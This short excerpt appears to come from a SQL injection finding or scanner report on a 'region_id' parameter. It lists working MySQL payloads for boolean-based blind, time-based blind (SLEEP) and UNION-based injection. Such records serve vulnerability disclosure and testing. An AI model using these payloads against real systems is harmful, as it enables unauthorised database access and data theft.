...
- **Type:** boolean-based blind
  ...
  - **Payload:** `region_id=1 AND 7413=7413`
- **Type:** time-based blind
  - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  - **Payload:** `region_id=1 AND (SELECT 7057 FROM (SELECT(SLEEP(5)))DCDt)`
- **Type:** UNION query
  - **Title:** Generic UNION query (NULL) - 3 columns
  - **Payload:** 
```
region_id=1 UNION ALL SELECT CONCAT(0x717a6b7671,0x41557244744c65416f6b4b5472564372677250516f6243627573584871684371594d76505a70544b,0x7162787171),NULL,NULL-- -
```
